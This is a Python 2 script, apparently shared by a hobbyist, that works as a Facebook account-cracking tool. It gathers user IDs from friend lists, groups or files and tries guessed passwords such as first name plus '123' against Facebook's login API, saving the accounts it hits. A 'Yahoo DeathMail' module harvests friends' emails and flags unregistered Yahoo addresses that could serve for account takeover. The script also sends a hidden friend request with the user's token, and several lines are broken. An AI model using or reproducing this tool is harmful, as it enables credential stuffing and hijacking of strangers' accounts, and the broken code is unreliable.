#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Mohsin Ali
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2021

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


#### LOGO ####
logo = """\033[1;95m
\033[1;91m ░██████╗██╗░░░██╗░█████╗░░█████╗░
\033[1;92m ██╔════╝╚██╗░██╔╝██╔══██╗██╔══██╗
\033[1;94m ╚█████╗░░╚████╔╝░██║░░╚═╝██║░░██║
\033[1;97m ░╚═══██╗░░╚██╔╝░░██║░░██╗██║░░██║
\033[1;93m ██████╔╝░░░██║░░░╚█████╔╝╚█████╔╝
\033[1;95m ╚═════╝░░░░╚═╝░░░░╚════╝░░╚════╝░
                                                     
                             \033[1;92m NOTE : IF U THINK YOU ARE BAD NO YOU ARE WRONG M YOUR DAD

\033[1;92m■■■■■■■■□■■■■■■■■□■■■■■■■■□■■■■■■■■□
          
\033[1;93mFACEBOOK ID :- MOHSIN ALI
\033[1;94mWHATSAPP :- 03063112***
\033[1;95mGITHUB :-https://github.com/MohsinTheLegend
\033[1;96mNOTE :- DON'T TRY TO COPY  :-)            

\033[1;92m■■■■■■■■□■■■■■■■■□■■■■■■■■□■■■■■■■■□"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print "\033[1;96m■■■■■■■■□■■■■■■■■□■■■■■■■■□■■■■■■■■□"

print  """\033[1;91m-->\x1b[1;94mMOHSIN ALI INNOCENT HU YAR 
\033[1;91m-->\x1b[1;94mMAI BURA HU OR BURA HE REHNA CHAHTA HU IT'S GOOD TO BE BAD ☠
\033[1;91m-->\x1b[1;94mMY WHATSAPP :- 03063112***
\033[1;91m-->\x1b[1;94mLOVE IS EASY BUT SYCO IS BUSY😎

        
\033[1;95m ███╗░░░███╗░█████╗░██╗░░██╗░██████╗██╗███╗░░██╗
\033[1;94m ████╗░████║██╔══██╗██║░░██║██╔════╝██║████╗░██║
\033[1;91m ██╔████╔██║██║░░██║███████║╚█████╗░██║██╔██╗██║
\033[1;92m ██║╚██╔╝██║██║░░██║██╔══██║░╚═══██╗██║██║╚████║
\033[1;93m ██║░╚═╝░██║╚█████╔╝██║░░██║██████╔╝██║██║░╚███║
\033[1;97m ╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚══╝

\033[1;91m ░█████╗░██╗░░░░░██╗
\033[1;92m ██╔══██╗██║░░░░░██║
\033[1;93m ███████║██║░░░░░██║
\033[1;94m ██╔══██║██║░░░░░██║
\033[1;95m ██║░░██║███████╗██║
\033[1;98m ╚═╝░░╚═╝╚══════╝╚═╝"""

       
     

print "\033[1;96m■■■■■■■■□■■■■■■■■□■■■■■■■■□■■■■■■■■□"

CorrectUsername = "MOHSIN"
CorrectPassword = "SYCO"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;95m[🔑] \x1b[1;93mUsername \x1b[1;94m : ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;95m[🔐] \x1b[1;93mPassword \x1b[1;94m :")
        if (password == CorrectPassword):
            print "\033[1;96mLogged in successfully as " + username
            loop = 'false'
        else:
            print "WRONG !"
            os.system('xdg-open https://www.facebook.com/MOHSIN.ALI.THE.FATHER.OF.HATERX')
    else:
        print "WRONG !"
        os.system('xdg-open https://www.facebook.com/MOHSIN.ALI.THE.FATHER.OF.HATERX')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;95m="
		print('\033[1;91m[--⌲] \x1b[1;92mLogin Your Facebook Id To Start Cloning' )
		id = raw_input('\033[1;91m[-->] \x1b[1;94mID / Email : \x1b[1;97m')
		pwd = raw_input('\033[1;91m[-->] \x1b[1;94mPassword : \x1b[1;97m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;91m[!] \x1b[1;95mNo Network Connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;96m[✓] \x1b[1;95mLogin Done :-)'
				os.system('xdg-open https://www.facebook.com/MOHSIN.ALI.THE.FATHER.OF.HATERX')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;95m[!] \x1b[1;95mNo Network Connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;95m[!] \x1b[1;95mOaps : \033[1;96mYour Account Is In Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;95m[!] \x1b[1;95mYour Account Email And Password Is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;95m[!] \x1b[1;95mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		Name = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;95m[!] \033[1;95mYour Account is in Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;95m[!] \x1b[1;91mError\033[1;95mThere is no Existing File"
		keluar()
	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print "\033[1;94m]\033[1;95m Name : \033[1;96m"+Name+"\033[1;97m               "
	print "\033[1;94m]\033[1;95m ID  : \033[1;96m"+id+"\x1b[1;97m              "
	print 42*"\033[1;92m="
	print "\x1b[1;95m Start Cloning"
	print "\x1b[1;95m Check Group List               "
	print "\x1b[1;95m Yahoo DeathMail             "
	print "\x1b[1;95m Logout            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;95m[!] \x1b[1;91mFill In Correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		grupsaya()
	elif unikers =="3":
		yahoo()
	elif unikers =="0":
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;91m[!] \x1b[1;95mFill In Correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] \x1b[1;95mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print 42*"\033[1;95m="
	print "\x1b[1;95mClone From Your FriendList"
	print "\x1b[1;95mClone From Public ID"
	print "\x1b[1;95mHack Fb Group"
	print "\x1b[1;95mHack From File/Folder"
	print "\x1b[1;95mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;91m --> \033[1;95m")
	if peak =="":
		print "\033[1;91m[!] \x1b[1;95mFill In Correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		jalan('\033[1;96m[☯] \033[1;92mSearching ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idt = raw_input("\033[1;37mEnter Friend Id \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mFriend Name\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] \x1b[1;95mInvalid Link!"
			raw_input("\n\033[1;96mBack\033[1;96m]")
			super()
		jalan('\033[1;96m[☯] \033[1;92mSearching ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print 42*"\033[1;95m="
		idg=raw_input('\033[1;93mGroup ID :\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;93mGroup Name :\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] \x1b[1;95mGroup Not Found"
			raw_input("\n\033[1;91m[\033[1;97mBack\033[1;96m]")
			super()
		jalan('\033[1;96m[☯] \033[1;96mSearching IDs Wait \033[1;97m...')
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=5000&access_token='+toket)
		s=json.loads(re.text)
		for p in s['data']:
			id.append(p['id'])
	elif peak =="4":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		try:
			idlist = raw_input('\x1b[1;93mInput Name file  : \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;91m[!] \x1b[1;95mFile Not Found'
			raw_input('\n\x1b[1;92mBack \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;91m[!] \x1b[1;95mFill In Correctly"
		pilih_super()
	
	print "\033[1;94mTotal IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;94mStart Cracking\033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\033[1;94mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;91m[!] \x1b[1;96mTo Stop Process Press CTRL Then z')
	print 42*"\033[1;94m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'12345'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
					cek = open("out/super_cp.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
							cek = open("out/super_cp.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name']+'123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
									cek = open("out/super_cp.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['Pakistan']+'123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
											cek = open("out/super_cp.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['Pakistan']+'1'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
													cek = open("out/super_cp.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['786786']
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
															cek = open("out/super_cp.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
															
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;96m] \033[1;92mProces Done\033[1;97m....'
	print"\033[1;96mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96mCp File Saved As \033[1;91m: \033[1;97mout/super_cp.txt")
	raw_input("\033[1;97mBack\033[1;96m]")
	super()


def grupsaya():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] \x1b[1;95mToken Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	try:
		uh = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
		gud = json.loads(uh.text)
		for p in gud['data']:
			Name = p["name"]
			id = p["id"]
			f=open('out/Grupid.txt','w')
			listgrup.append(id)
			f.write(id + '\n')
			print "\033[1;94mGroup\033[1;95m]\x1b[1;97m "+str(id)+" \x1b[1;96m=>\x1b[1;97m "+str(Name)
		print 42*"\033[1;94m="
		print"\033[1;94mTotal Groups are \033[1;97m:\033[1;97m %s"%(len(listgrup))
		print("\033[1;94mStored Group \033[1;97m: \033[1;97mout/Grupid.txt")
		f.close()
		raw_input("\033[1;97mBack\033[1;96m")
		menu()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] \x1b[1;95mDone")
		raw_input("\033[1;97mBack\033[1;96m")
		menu()
	except KeyError:
		os.remove('out/Grupid.txt')
		print('\033[1;91m[!] \x1b[1;91mGroup Not Found')
		raw_input("\033[1;97mBack\033[1;96m")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[☠] \x1b[1;91mError"
		keluar()
	except IOError:
		print "\033[1;91m[!] \x1b[1;95mError"
		raw_input("\033[1;97mBack\033[1;96m")
		menu()


def yahoo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print 42*"\033[1;95m="
	print "\x1b[1;93m Clone From Friend Id"
	print "\x1b[1;93m Clone From Friend "
	print "\x1b[1;93m Clone From member group"
	print "\x1b[1;93m Clone From file"
	print "\x1b[1;91m Back"
	clone()
       
def clone():
	embuh = raw_input("\n\x1b[1;97m --> ")
	if embuh =="":
		print "\033[1;91m[!] \x1b[1;95mFill In Correctly"
	elif embuh =="1":
		clone_From_List_Friend()
	elif embuh =="2":
		clone_From_Friend()
	elif embuh =="3":
		clone_From_member_group()
	elif embuh =="4":
		clone_From_file()
	elif embuh =="0":
		menu()
	else:
		print "\033[1;91m[!] \x1b[1;95mFill In Correctly"
		

def clone_From_List_Friend():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token Invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;93m="
	jalan('\033[1;94mTaken email \033[1;97m...')
	Friend = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	kimak = json.loads(Friend.text)
	save = open('out/MailVuln.txt','w')
	jalan('\033[1;94mStart \033[1;97m...')
	print ('\x1b[1;91m[!] \x1b[1;91mStop CTRL+z')
	print 42*"\033[1;96m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		Name = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write("Name: "+ Name +"ID :" + id +"Email: "+ mail + '\n')
					print("\033[1;96m[\033[1;92mVULN✓\033[1;96m] \033[1;92m" +mail+" \033[1;96m=>\x1b[1;97m"+Name)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;95m \033[1;92mDone \033[1;97m....'
	print"\033[1;95mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;95mFile Saved \033[1;91m:\033[1;97m out/MailVuln.txt"
	save.close()
	raw_input("\033[1;97mBack\033[1;96m")
	menu()


def clone_From_Friend():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] \x1b[1;95mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;95m="
	idt = raw_input("\033[1;93mFriend Id \033[1;93m: \033[1;97m")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;96mName :\033[1;97m "+op["name"]
	except KeyError:
		print"\033[1;91m[!] \x1b[1;95mFriend Not Found"
		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
		menu()
	jalan('\033[1;94mTake email \033[1;97m...')
	Friend = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
	kimak = json.loads(Friend.text)
	save = open('out/FriendMailVuln.txt','w')
	jalan('\033[1;94mWait A while the process has been started\033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;93mTo stop Proces Press CTRL Then z')
	print 43*"\033[1;96m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		Name = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write("Name: "+ Name +"ID :" + id +"Email: "+ mail + '\n')
					print("\033[1;96m[\033[1;92mVULN✓\033[1;96m] \033[1;92m" +mail+" \033[1;96m=>\x1b[1;97m"+Name)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;96m \033[1;92mDone \033[1;97m....'
	print"\033[1;96mTotal \033[1;96m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96mFile Saved :\033[1;97m out/FriendMailVuln.txt"
	save.close()
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def clone_From_member_group():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] \x1b[1;95mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;92m="
	id=raw_input('\033[1;93mGroup Id =\033[1;97m ')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;96mGroup Name :\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] \x1b[1;95mError Group Not Found"
		raw_input("\033[1;97mBack\033[1;96m]")
		menu()
	jalan('\033[1;94mTake email \033[1;97m...')
	Friend = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
	kimak = json.loads(Friend.text)
	save = open('out/GrupMailVuln.txt','w')
	jalan('\033[1;94m[✺] \033[1;93mStart Cracking wait a while ☕\033[1;97m...')
	print('\x1b[1;94mTo stop proces press CTRL Then z')
	print 42*"\033[1;93m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		Name = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write("Name: "+ Name +"ID :" + id +"Email: "+ mail + '\n')
					print("\033[1;96m[\033[1;97mVULN✓\033[1;96m] \033[1;92m" +mail+" \033[1;96m=>\x1b[1;97m"+Name)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;96mDone \033[1;97m....'
	print"\033[1;96mTotal : \033[1;97m"+str(len(berhasil))
	print"\033[1;96mFile Stored :\033[1;97m out/GrupMailVuln.txt"
	save.close()
	raw_input("\033[1;97mBack\033[1;96m]")
	menu()


def clone_From_file():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] \x1b[1;95mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	files = raw_input("\033[1;93mName File : \033[1;97m")
	try:
		total = open(files,"r")
		mail = total.readlines()
	except IOError:
		print"\033[1;95mFile Not Found"
		raw_input("\033[1;97mBack\033[1;96m]")
		menu()
	mpsh = []
	jml = 0
	jalan('\033[1;93mStart Cracking wait a while  ☕\033[1;97m...')
	print('\x1b[1;91m[!] \x1b[1;93mTo Stop Process Press CTRL them Z')
	save = open('out/FileMailVuln.txt','w')
	print 42*"\033[1;96m="
	mail = open(files,"r").readlines()
	for pw in mail:
		mail = pw.replace("\n","")
		jml +=1
		mpsh.append(jml)
		yahoo = re.compile(r'@.*')
		otw = yahoo.search(mail).group()
		if 'yahoo.com' in otw:
			br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			br._factory.is_html = True
			br.select_form(nr=0)
			br["username"] = mail
			klik = br.submit().read()
			jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
			try:
				pek = jok.search(klik).group()
			except:
				continue
			if '"messages.ERROR_INVALID_USERNAME">' in pek:
				save.write(mail + '\n')
				print("\033[1;96m[\033[1;92mVULN✓\033[1;96m] \033[1;92m" +mail)
				berhasil.append(mail)
	print 42*"\033[1;96m="
	print '\033[1;94mDone \033[1;97m....'
	print"\033[1;94mTotal : \033[1;97m"+str(len(berhasil))
	print"\033[1;94mFile Stored :\033[1;97m out/FileMailVuln.txt"
	save.close()
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
       
		
if __name__ == '__main__':
	login()
